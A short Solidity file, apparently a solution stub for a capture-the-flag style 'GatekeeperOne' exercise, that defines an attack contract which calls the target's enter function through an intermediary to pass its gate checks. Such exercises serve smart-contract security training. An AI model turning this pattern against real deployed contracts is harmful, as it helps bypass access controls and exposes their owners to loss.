pragma solidity ^0.8.0;

import "../../../Exercise/Stage2/13/GateKeeperOne.sol";
contract AttackGateKeeperOne {
     GatekeeperOne target;

     constructor(GatekeeperOne _target) {
         target = _target;
     }

    function attack(bytes8 key) external payable {
         target.enter(key);
    }
}
